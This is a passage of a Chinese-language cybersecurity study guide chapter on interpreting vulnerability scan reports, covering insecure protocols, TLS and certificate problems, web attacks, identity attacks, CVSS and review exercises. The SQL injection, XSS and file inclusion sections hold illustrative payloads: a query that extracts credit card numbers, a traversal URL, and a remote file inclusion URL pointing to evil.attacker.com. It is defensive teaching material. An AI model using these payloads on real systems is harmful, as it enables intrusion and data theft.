  \ 中对这些补丁进行了描述。\n\n![图 7.9 代码执行漏洞](img/c07f009.png)\n\n图 7.9 代码执行漏洞\n\n## 不安全设计\n\
  \n互联网早期网络上使用的许多旧协议在设计时并未考虑安全性。它们通常未能使用加密技术来保护用户名、密码以及在开放网络上传输的内容，导致协议用户暴露于窃听攻击之下。`Telnet`\
  \ 是一个用于获取远程服务器命令行访问权限的不安全协议示例。文件传输协议（`FTP`）提供了在系统之间传输文件的能力，但没有整合安全功能。图 7.10 显示了一个扫描报告示例，检测到了支持不安全的\
  \ `FTP` 协议的系统。\n\n解决此问题的办法只需切换到更安全的协议。幸运的是，`Telnet` 和 `FTP` 都有加密的替代方案。系统管理员在寻求获取远程系统的命令行访问时，可以使用\
  \ Secure Shell (`SSH`）作为 `Telnet` 的安全替代品。同样，安全文件传输协议（`SFTP`）和 FTP-Secure（`FTPS`）都提供了系统间传输文件的安全方法。\n\
  \n![图 7.10 FTP 明文认证漏洞](img/c07f010.png)\n\n图 7.10 FTP 明文认证漏洞\n\n## 安全配置错误\n\n系统的配置错误可能导致攻击者获取有关系统安全设置的信息，甚至允许他们利用配置不当的系统。\n\
  \n许多开发平台支持 `debug modes`（调试模式），为开发人员提供开发过程中排除应用程序故障所需的关键信息。调试模式通常提供有关应用程序、服务器以及支持数据库内部运行的详细信息。尽管这些信息对开发人员有用，但它们可能会无意中协助寻求获取数据库结构、应用程序使用的身份验证机制或其他细节的攻击者。出于此原因，漏洞扫描会对被扫描服务器上存在调试模式的情况发出警报。图\
  \ 7.11 显示了此类扫描结果的示例。\n\n在此示例中，目标系统似乎是一个支持 `ASP.NET` 开发环境的 Windows 服务器。报告的 `Output`（输出）部分表明，当客户端发送\
  \ `DEBUG` 请求时，服务器会做出响应。\n\n解决此问题需要开发人员配合，并禁用公网系统上的调试模式。在成熟的组织中，软件开发应始终在仅限私有网络访问的专用开发环境中进行。应该鼓励（或要求！）开发人员仅在专用该目的系统上进行测试，而在那些服务器上启用调试模式是完全合理的。没有必要在面向公共系统上支持此功能。\n\
  \n![图 7.11 调试模式漏洞](img/c07f011.png)\n\n图 7.11 调试模式漏洞\n\n### 网络漏洞\n\n现代互联网络使用复杂的底层组件和网络设备来提供广泛的访问。这些网络及其组件部分也容易受到漏洞扫描检测的安全漏洞的影响。\n\
  \n### 缺失固件更新\n\n操作系统和应用程序并不是唯一需要定期安全更新的设备。漏洞扫描也可以检测到需要固件更新的网络设备的安全问题。这些漏洞产生的报告与图\
  \ 7.6 中的操作系统缺失补丁报告类似，并引导管理员前往供应商网站下载固件更新的位置。\n\n### 加密失败\n\n`安全套接层 (SSL)` 协议及其后续者\
  \ `传输层安全 (TLS)` 为互联网和私有网络上的信息交换提供了安全手段。尽管这些协议可用于加密任何类型的网络通信，但它们最常用于加密 Web 服务器的连接，并被终端用户熟悉地称为\
  \ `HTTPS` 中的“S”。\n\n### 过时的 SSL/TLS 版本\n\n`SSL` 不再被认为是安全的，不应在生产系统中使用。`TLS` 的早期版本也是如此。漏洞扫描器可能会报告\
  \ Web 服务器正在使用这些协议，安全分析师应该理解，任何使用这些过时 `SSL` 和 `TLS` 版本的连接可能受到窃听攻击。图 7.12 显示了一个包含多个支持过时\
  \ `SSL` 版本 3 网络的扫描报告示例。\n\n支持过时 `SSL` 和 `TLS` 版本的服务器管理员应在其服务器上禁用这些旧协议的支持，并仅支持新协议（如\
  \ `TLS` 版本 1.2 或 1.3）。\n\n#### 不安全的密码使用\n\n\n\n\nSSL 和 TLS 通常被描述为加密算法，但实际上并非如此。SSL\
  \ 和 TLS 协议描述了如何使用加密密码件来保护网络通信，但它们本身并不是加密密码件。相反，它们允许管理员根据每个服务器指定在这些协议上可使用的加密密码件。当客户端和服务器想要使用\
  \ SSL/TLS 通信时，它们会交换各自系统支持的密码件列表，并就双方都能接受的密码件达成一致。\n\n某些密码件存在漏洞，因为容易受到窃听攻击而变得不稳定。例如，图\
  \ 7.13 显示了一个支持不安全的 `RC4` 密码件的系统扫描报告。\n\n![FIGURE 7.12 过时的 SSL 版本漏洞](img/c07f012.png)\n\
  \nFIGURE 7.12 过时的 SSL 版本漏洞\n\n解决这一常见问题需要更改受影响服务器上支持的密码件 set 集，并确保只使用安全的密码件。\n\n\
  #### 证书问题\n\nSSL 和 TLS 依赖于使用数字证书来验证服务器身份并交换加密密钥。网站用户熟悉网络浏览器中显示的错误信息，例如图 7.14 所示。这些错误通常包含关于访问网站安全性的极重要信息，但遗憾的是，它们往往被忽视。\n\
  \n漏洞扫描也可能检测到支持 SSL 和/或 TLS 的服务器所提供的证书问题。常见错误包括：\n\n![FIGURE 7.13 不安全的 SSL 密码件漏洞](img/c07f013.png)\n\
  \nFIGURE 7.13 不安全的 SSL 密码件漏洞\n\n*   **证书上的名称与服务器名称不匹配**：这是一个非常严重的错误，因为它可能表明使用了从另一个站点获取的证书。这在数字世界等同于某人“用”朋友的假身份证。\n\
  *   **数字证书过期**：数字证书有有效期和过期日期。当你看到过期的证书时，通常意味着服务器管理员未能及时更新证书。\n*   **未知证书颁发机构 (CA)**：任何人都可以创建数字证书，但只有当证书接收者信任颁发证书的实体时，数字证书才有用。操作系统和浏览器包含了信任已知\
  \ CA 的指令，但如果遇到由未知或不受信任的 CA 颁发的证书，将显示错误。\n\n![FIGURE 7.14 无效证书警告](img/c07f014.png)\n\
  \nFIGURE 7.14 无效证书警告\n\n图 7.14 所示的错误表明用户正尝试访问一个提供无效证书的网站。从 URL 栏可以看到用户正尝试访问提供无效证书的网站。\n\
  \n#### 内部 IP 泄露\n\nIP 地址有两种变体：可以通过互联网访问的公共地址和通常用于本地网络的私有地址。配置不当的服务器可能会向远程系统泄露其私有地址。攻击者可以使用这些信息获取更多关于防火墙网络内部配置的信息。当系统在\
  \ HTTP 请求的响应中包含自身的私有地址时，就会发生这种情况。\n\n其中一些设备使用 `network address translation (NAT)`\
  \ 将 `public address` 映射到 `private address`。然而，系统并不知道正在使用 `NAT`，因此可能会在响应中泄露信息。当系统在响应中包含其私有地址时，就会发生这种情况。图\
  \ 7.15 显示了此类信息泄露的示例。\n\n![FIGURE 7.15 内部 IP 漏洞](img/c07f015.png)\n\nFIGURE 7.15\
  \ 内部 IP 漏洞\n\n### 基础设施与运营技术\n\n在某些环境中，网络安全分析师可能会遇到数据采集与监控控制 (SCADA) 系统、工业控制系统 (ICS)、物联网\
  \ (IoT) 以及其他 `operational technology (OT)` 的示例。这些系统允许物理设备和过程连接到网络，为寻求使业务流程更高效的组织提供了大量数据源。然而，它们也引入了新的安全问题。\n\
  \nIoT 世界还扩展到涉及物理基础设施管理的系统。例如，物理访问控制系统通常与闸机、门、大门和其他设施入口发生交互。建筑自动化系统与供暖通风空调 (HVAC)\
  \ 系统、消防系统和其他建筑控制设备发生交互。\n\n#### PLC 与 Modbus\n\n工业控制系统依赖于分布在整个组织的系列传感器和控制器，收集信息并控制活动。可编程逻辑控制器\
  \ (PLC) 是设计在 IoT 环境中运行的专用硬件控制器。PLC 通常使用名为 `Modbus` 的专用通信协议，通过有线串行接口与传感器和其他 IoT 组件进行通信。\n\
  \n与网络上的任何其他设备一样，IoT 设备可能存在安全漏洞，并受到网络攻击。然而，修补 IoT 设备通常比其传统的服务器对应更困难，因为获取补丁很困难。IoT\
  \ 设备制造商可能不使用自动更新机制，网络安全分析师感知更新的唯一方法是通过漏洞扫描或主动订阅 IoT 设备制造商发布的安全公告。\n\n\n\n\n`Injection\
  \ flaws` 发生在攻击者能够通过 Web 服务器向后端系统发送命令，从而绕过正常的安全控制，并欺骗后端系统使其认为该请求来自 Web 服务器。这种攻击最常见的形式是\
  \ `SQL injection attack`，它利用 Web 应用程序向后端数据库服务器发送未经授权的命令。\n\nWeb 应用程序经常接收来自用户的输入，并使用它来构建数据库查询，以生成返回给用户的结果。例如，考虑电子商务网站上的搜索功能。如果用户在搜索框中输入\
  \ `orange tiger pillows`，Web 服务器需要知道目录中的哪些产品可能匹配此搜索词。它可能会向后端数据库服务器发送一个类似所示的请求：\n\
  \n```sql\nSELECT ItemName, ItemDescription, ItemPrice\nFROM Products\nWHERE ItemName\
  \ LIKE '%orange%' AND\nItemName LIKE '%tiger%' AND\nItemName LIKE '%pillow%'\n```\n\
  \n该命令检索一个可以包含在返回给终端用户的项目列表。在 `SQL injection attack` 中，攻击者可能会向 Web 服务器发送一个看起来非常异常的请求，例如搜索：\n\
  \n```sql\norange tiger pillow'; SELECT CustomerName, CreditCardNumber FROM Orders;\
  \ --\n```\n\n如果 Web 服务器简单地将此请求传递给数据库服务器，它将执行以下操作（为了方便查看进行了简单的格式调整）：\n\n```sql\n\
  SELECT ItemName, ItemDescription, ItemPrice\nFROM Products\nWHERE ItemName LIKE\
  \ '%orange%' AND\nItemName LIKE '%tiger%' AND\nItemName LIKE '%pillow';\nSELECT\
  \ CustomerName, CreditCardNumber\nFROM Orders;\n--%'\n```\n\n该命令如果成功，将运行两个不同的 SQL\
  \ 查询（由分号隔开）。第一个查询将检索产品信息，第二个查询将检索客户姓名和信用卡号列表。\n\n防止 `SQL injection attacks` 的两种最佳方法是输入验证和对数据库访问强制执行最小权限限制。输入验证可确保用户不会向\
  \ Web 服务器提供意外的文本。它将阻止使用单引号（'），而该单引号是“跳出”原始 SQL 查询所必需的。最小权限限制了 Web 服务器可以访问的表，并可以防止用于处理目录信息请求的进程检索信用卡信息。\n\
  \n漏洞扫描器可以检测注入漏洞，例如 图 7.16 所示的漏洞。当网络安全分析师注意到潜在的注入漏洞时，他们应该与开发者密切合作，以验证漏洞确实存在并修复受影响的代码。\n\
  \n### 跨站脚本\n\n在 `cross-site scripting (XSS)` 攻击中，攻击者在网站上嵌入脚本命令，这些命令稍后将被访问该网站的毫无防备的游客执行。其核心目的是欺骗访问受信任网站的用户执行由不受信任第三方放置在那里的恶意代码。\n\
  \n跨站脚本攻击以两种不同的形式出现：\n\n- `Persistent XSS` 攻击发生在攻击者能够实际将攻击代码存储在服务器上时。该代码保留在服务器上，等待用户请求受影响的内容。这些攻击被称为存储型\
  \ XSS 攻击。\n- `Reflected XSS` 攻击发生在攻击者欺骗用户作为查询字符串或其他内容的一部分将攻击发送到服务器时。服务器随后将攻击返回给用户（反射），导致代码执行。\n\
  \n![图 7.16 SQL 注入漏洞](img/c07f016.png)\n\n**图 7.16** SQL 注入漏洞\n\n图 7.17 显示了在 Nessus\
  \ 漏洞扫描期间检测到的 XSS 漏洞示例。\n\n在扫描期间发现潜在 XSS 漏洞的网络安全分析师应与开发者合作，评估结果的有效性并实施适当的控制措施来防止此类攻击，例如输入验证。\n\
  \n![图 7.17 跨站脚本漏洞](img/c07f017.png)\n\n**图 7.17** 跨站脚本漏洞\n\n### 目录遍历\n\n在 `directory\
  \ traversal` 攻击中，攻击者向查询字符串中插入文件路径值，试图导航到位于通常未授权公共访问区域的文件。当文件名包含在查询字符串中，可能会发生此类攻击。例如，如果\
  \ Web 应用程序从远程存储设备检索策略文档，它可能会在查询字符串中包含策略名称，如下：\n\n```\nwww.myserver.com/policy?document='aup.pdf'\n\
  ```\n\nWeb 应用程序可能会看到此查询字符串，然后去策略存储库检索名为 `aup.pdf` 的文档。如果攻击者知道策略存储库与工资记录位于同一台服务器上，他们可能会尝试使用以下查询字符串来检索\
  \ Mike 的工资记录：\n\n```\nwww.myserver.com/policy?document='../payroll/mike.pdf'\n```\n\
  \n该查询字符串试图遍历存储服务器的目录结构，导航到策略文件夹的父目录，然后进入工资单目录。\n\n开发者和安全专业人员应实施三类控制措施来防止目录遍历攻击。首先，应用程序设计应避免在用户可操作的字段（如查询字符串）中包含文件名。其次，输入验证应防止使用执行目录遍历所需的特殊字符。最后，存储服务器上的访问控制应限制\
  \ Web 服务器对已授权公共访问的文件的访问。\n\n### 文件包含\n\n`File inclusion attacks` 将目录遍历提升到了新的高度。文件包含攻击并不是简单地从操作系统检索文件并显示给攻击者，而是实际上执行文件中所包含的代码，允许攻击者欺骗\
  \ Web 服务器执行任意代码。\n\n文件包含攻击有两种变体：\n\n- `Local file inclusion (LFI)` 攻击试图执行存储在 Web\
  \ 服务器其他位置的文件中的代码。其工作方式与目录遍历攻击非常相似。例如，攻击者可能会使用以下 URL 执行位于 Windows 服务器 `C:\\www\\\
  uploads` 目录下的 `attack.exe` 文件：\n\n- `www.mycompany.com/app.php?include=C:\\www\\\
  uploads\\attack.exe`\n- `Remote file inclusion (RFI)` 攻击允许攻击者更进一步，执行存储在远程服务器上的代码。此类攻击特别危险，因为攻击者可以直接控制正在执行的代码，而无需先在本地服务器存储文件。例如，攻击者可能会使用此\
  \ URL 执行存储在远程服务器上的攻击文件：\n\n- `www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe`\n\
  \n当攻击者发现文件包含漏洞时，他们通常利用它向服务器上传 *web shell*。 允许攻击者在服务器上执行命令并在浏览器中查看结果。这种方法让攻击者通过常用的\
  \ HTTP 和 HTTPS 端口访问服务器，使其流量不易被安全工具检测。此外，攻击者甚至可能修复他们用于访问服务器的初始漏洞，以防止其他寻求控制服务器的攻击者发现它，或防止安全团队察觉到已成功的攻击。\n\
  \n### 请求伪造\n\n`Request forgery` 攻击利用信任关系，并试图让用户在不知情的情况下对远程服务器执行命令。这类攻击有两种形式：跨站请求伪造（CSRF）和服务器端请求伪造（SSRF）。\n\
  \n\n\n\n\n# 跨站请求伪造 (CSRF/XSRF)\n\n`Cross-site request forgery`（跨站请求伪造）攻击，简称 `XSRF`\
  \ 或 `CSRF` 攻击，与跨站脚本攻击相似，但利用的是不同的信任关系。`XSS` 攻击利用的是用户对网站的信任，在用户的计算机上执行代码。而此类攻击则是利用了远程站点对用户系统的信任，从而代表用户执行命令。\n\
  \nXSRF 攻击的运作原理是基于一个合理的假设：用户通常同时登录了许多不同的网站。攻击者在其中一个网站中嵌入代码，向另一个网站发送命令。当用户点击第一个网站上的链接时，他们就在不知不觉的情况下向第二个网站发送了命令。如果该用户恰好登录了第二个网站，该命令就可能执行成功。\n\
  \n例如，考虑一个在线银行网站。想要从用户账户中窃取资金的攻击者可能会去在线论坛发布一条包含链接的消息。该链接实际上直接进入了转账网站，并发出了一条将资金转移到攻击者账户的命令。攻击者随后将链接留在论坛上，等待毫无防备的用户出现并点击链接。如果该用户恰好登录了银行网站，转账就成功了。\n\
  \n开发者应该保护其 Web 应用程序免受 XSRF 攻击。一种方法是创建使用安全令牌的网络应用程序，攻击者无法将这些令牌嵌入链接中。另一种保护措施是网站检查来自终端用户请求中的引用\
  \ URL，并仅接受来自自身网站的请求。\n\n# 服务器端请求伪造 (SSRF)\n\n`Server-side request forgery` (`SSRF`)\
  \ 攻击利用了类似的漏洞，但它们不是欺骗用户的浏览器访问 URL，而是欺骗服务器根据用户提供的输入访问 URL。当 Web 应用程序接受用户的 URL 作为输入并从该\
  \ URL 获取信息时，就会发生 SSRF 攻击。如果服务器可以访问非公开 URL，SSRF 攻击可能会无意中将这些信息泄露给攻击者。\n\n# 识别与身份失效\n\
  \n针对身份和访问管理系统以及身份信息使用的常见方法有很多，每种方法都有常见的保护措施可以帮助修复它们。其中许多问题的核心是访问控制系统存在缺陷——设计不当或实现不当的访问控制系统使组织面临各种攻击。这些包括密码喷洒、凭据填充、冒充、中间人（on-path）和会话劫持攻击。\n\
  \n## 密码复用\n\n由于用户于在多个站点上复用相同的密码，产生了两种常见的身份验证漏洞：\n\n* `Password spraying` (密码喷洒)\
  \ 攻击发生在攻击者使用常用密码列表，并尝试用这些常用密码登录许多不同的用户账户时。攻击者只需要找到一个有效的用户名/密码组合即可获得系统的权限。当用户没有选择足够独特的密码时，这种攻击就会成功。\n\
  \n* `Credential stuffing` (凭据填充) 攻击发生在攻击者获取了从某个网站泄露事件中窃取的用户名和密码列表，并使用它们尝试访问另一个可能与之无关的网站时。当用户在许多不同网站上复用相同的密码时，凭据填充攻击就会成功。\n\
  \n除了鼓励良好的密码管理实践外，管理员还可以通过要求在敏感系统中使用多因素身份验证，进一步保护自己免受密码复用漏洞的影响。\n\n## 冒充\n\n`Impersonation`（冒充）攻击发生在攻击者冒用合法用户的身份时。`OAuth`\
  \ 开放重定向等安全问题可能导致冒充的发生。防止冒充可能需要更强的会话处理技术，例如在 `http://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html`\
  \ 的 `OWASP` 会话管理备忘表中所找到的技术。其他类型的冒充可以通过保护攻击者可能在本地工作站或通过网络获取的会话标识符来防止。\n\n![FIGURE\
  \ 7.18 Alice 与银行 Web 服务器通信](img/c07f018.png)\n\nFIGURE 7.18 Alice 与银行 Web 服务器通信\n\
  \n图 7.18 显示了正常的通信，其中 Alice 建立了一个 `HTTPS` 连接，然后与 Web 服务器进行安全通信。如果窃者看到与此连接相关的网络流量，他们无法读取通信内容，因为经过了加密。\n\
  \n然而，如果攻击者能够冒充银行 Web 服务器，如图 7.19\n\nFIGURE 7.19 中间人攻击 (On-path attack)\n\n会话或网络链路的端端加密可以帮助降低中间人攻击成功的概率，除非攻击者控制了端点或拥有加密密钥。\n\
  \n## 中间人攻击\n\n`On-path attacks`（路径攻击），也称为 `man-in-the-middle` (`MitM`) 攻击，发生在攻击者能够干扰两个系统之间的通信流时。例如，想象名为\
  \ Alice 的用户试图与她的银行 Web 服务器通信，如[图 7.18](#c07.xhtml#c07-fig-0018）所示。\n\n### 会话劫持\n\
  \n`Session hijacking`（会话劫持）侧重于接管已存在的会话，通过获取远程服务器用于验证会话的会话密钥或 Cookie，或者通过让会话通过攻击者控制的系统，使其参与会话。与冒充和中间人攻击类似，通过加密网络会话或链路或在本地系统上保护攻击者劫持会话需要获取的数据，可以帮助限制会话劫持的机会。\n\
  \n### 数据投毒\n\n`Machine learning`（机器学习）是一门学科，旨在应用计算机科学和统计学的原理来揭示我们每天积累的数据中隐藏的知识。机器学习通过分析数据来发现趋势、分类记录，并帮助我们更高效地经营业务。\n\
  \n许多机器学习技术使用过去活动的训练数据集来生成一个可能用于预测未来的模型。如果攻击者能够修改或影响训练数据集的创建，他们就可以导致公司用于做出关键业务决策的模型发生变化。`Data\
  \ poisoning`（数据投毒）攻击试图操纵训练数据集，导致机器学习算法创建不准确的模型。\n\n\n\n\n漏洞扫描器通常使用通用漏洞评分系统（`CVSS`）对检测出的问题进行排序。CVSS\
  \ 为每个漏洞提供了六项衡量指标：访问向量指标、访问复杂度指标、身份验证指标、机密性指标、完整性指标和可用性指标。这些指标共同反映了漏洞被成功利用的可能性以及其对组织可能产生的影响。\n\
  \n分析师在解释扫描结果时，应该留心常见问题。当扫描器错误地报告一个实际上并不存在的漏洞时，就会发生误报报告。如果分析师对结果的准确性产生怀疑，他们应该进行手动验证。在验证漏洞时，分析师应该利用自己的专业知识以及组织内其他人的相关领域专业知识。为了成功解释漏洞报告，分析师必须熟悉常见的漏洞类型。\n\
  \n## 考试要点\n\n**解释漏洞扫描报告如何为网络安全分析师提供关键信息。** 漏洞扫描报告在提供系统中存在的漏洞详细信息外，还提供了关重要的严重程度和故障排除信息。报告通常包含触发漏洞报告的请求和响应，以及针对该问题的建议解决方案。分析师必须理解如何识别、验证和修复发生的漏洞。\n\
  \n**了解通用漏洞评分系统（CVSS）的。** CVSS 基础分在 10 分制上计算出一个标准衡量值，该值包含了利用漏洞所需的访问向量信息、攻击利用的复杂性以及执行攻击所需的身份验证。基础分还考虑了漏洞对受影响系统的机密性、完整性和可用性的影响。\n\
  \n**解释服务器和终端设备为何是漏洞常见的来源。** 缺少补丁和过时的操作系统是两个常见的漏洞来源，可以通过主动的设备维护轻松修复。缓冲区溢出、权限提升和任意代码执行攻击通常利用应用程序缺陷。支持不安全协议的设备也是漏洞的常见来源。\n\
  \n**解释关键基础设施和专用技术如何增加漏洞扫描的复杂性。** 网络安全分析师应该理解如何对移动设备和操作技术（OT）组件进行扫描和解释。识别扫描车辆、无人机、建筑自动化系统、物理访问控制系统和工业控制系统增加的难度。\n\
  \n**了解软件漏洞需要分析师与开发者之间的协作。** 尤其是 Web 容易受到 SQL 和 XML 注入攻击。所有软件都可能包含缓冲区、整数和堆溢出漏洞。修复这些问题通常需要重写代码并对漏洞应用程序进行重新扫描，以确认修复妥当。\n\
  \n## 实验练习\n\n###  活动 7.1：解释漏洞扫描\n\n在活动 6.2 中，你对你控制的网络运行了漏洞扫描。在本实验中，你将解释该漏洞扫描的结果。\n\
  \n仔细查看扫描结果，并为你的网络制定一个修复计划。该计划应仔细考虑每个漏洞的严重程度、每个漏洞可能是误报结果的可能性，以及完成修复所需的时间。\n\n###\
  \  活动 7.2：分析 CVSS\n\n在本实验中，你将解释漏洞扫描的结果以评估严重程度和影响。\n\n仔细查看扫描结果，并为你的网络制定一个修复计划。该计划应仔细考虑每个漏洞的严重程度、每个漏洞可能是误报结果的可能性，以及完成修复所需的时间。\n\
  \n###  活动 7.3：修复漏洞\n\n在本实验中，你将修复你在活动 7.1 中识别出的漏洞之一。\n\n1. 执行修复。\n2. 运行新的漏洞扫描以确认漏洞已修复。\n\
  \n## 复习题\n\n1. Tom 正在查看漏洞扫描结果，发现其中一台服务器存在 IP 地址泄露。可能在使用哪种技术？\n   - TLS\n   - NAT\n\
